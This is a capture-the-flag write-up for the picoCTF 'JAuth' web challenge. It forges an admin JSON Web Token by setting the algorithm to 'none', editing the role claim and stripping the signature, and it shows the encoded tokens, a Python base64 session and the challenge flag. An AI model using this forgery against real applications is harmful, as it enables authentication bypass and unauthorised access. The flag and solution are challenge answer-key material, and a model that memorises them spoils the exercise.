### JAuth


#Medium #web_exploitation #picoGym #Exclusive

Author: Geoffrey Njogu

#### Description

Most web application developers use third party components without testing their security. Some of the past affected companies are:

- Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
- Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
- VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one?

Can you identify the components and exploit the vulnerable one? The website is running [here](http://saturn.picoctf.net:60826/). Can you become an `admin`? You can login as `test` with the password `Test123!` to get started.


##### Solution:

method 1 use burpsuite
login as `test` with the password `Test123!`
open burpsuite 

![](JAuth/jauth_jwt.png)

JWT token
```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NzE4NDR9.edqVC6GyqaRxEvxGsrkTrKDUnPE70z41hxS1rkOLl2A
```

Note that [https://jwt.io/](https://jwt.io/) doesn't work, since algorithm can't be set to `none` in it use this [link](https://token.dev/)

![](JAuth/jauth_jwt_dev.png)

modify Jwt token

![](JAuth/jauth_jwt_dev_modified.png)

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ
```

![](JAuth/jauth_auth_failed.png)

not working but why???
to fix this we need to figure out Jwt token
A **JWT (JSON Web Token)** consists of three parts, separated by dots (`.`):

1. **Header**
2. **Payload (Claims)**
3. **Signature**

```css
header.payload.signature
```

Your provided JWT:

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NzE4NDR9.edqVC6GyqaRxEvxGsrkTrKDUnPE70z41hxS1rkOLl2A
```

Now, let's break it down:

### **1️⃣ Header (First part)**

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

Decoded:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

This specifies that the token is a JWT and uses the **HS256** signing algorithm.

---

### **2️⃣ Payload (Second part)**

```css
eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NzE4NDR9
```

Decoded:

```json
{
  "auth": 1739871843960,
  "agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1739871844
}
```

This contains user-related information, such as:

- `auth`: Possibly an authentication timestamp.
- `agent`: Browser and OS details.
- `role`: The user role (`user`).
- `iat`: Issued at timestamp.

---

### **3️⃣ Signature (Third part)**

```css
edqVC6GyqaRxEvxGsrkTrKDUnPE70z41hxS1rkOLl2A
```

This is generated using the header and payload, along with a **secret key**. It's used to **verify the integrity** of the token.

---

### **Final Breakdown**

|Part|Value|
|---|---|
|**Header**|`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`|
|**Payload**|`eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NzE4NDR9`|
|**Signature**|`edqVC6GyqaRxEvxGsrkTrKDUnPE70z41hxS1rkOLl2A`|

now to fix the error just add dot(.) because third part is missing
```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ.
```

![](JAuth/jauth_flag.png)

flag is `picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}`

2nd method is 
using browser simply put this jwt into cookies and get your flag

----

```css
┌──(kali㉿kali)-[~]
└─$ python3          
Python 3.12.9 (main, Feb  5 2025, 01:31:18) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> base64.b64decode(b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9')
b'{"typ":"JWT","alg":"HS256"}'
>>> base64.b64encode(b'{"typ":"JWT","alg":"none"}')
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0='
>>> base64.b64encode(b'{"auth":1739871843960,"agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36","role":"admin","iat":1739871844}')
b'eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ=='
>>> 
```

final token is

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ==

```

remove `==` sign and combine them with dot `(.)`

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ
```

add another dot `(.)` for complete three part of jwt `header.payload.signature`

```css
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzM5ODcxODQzOTYwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM5ODcxODQ0fQ.
```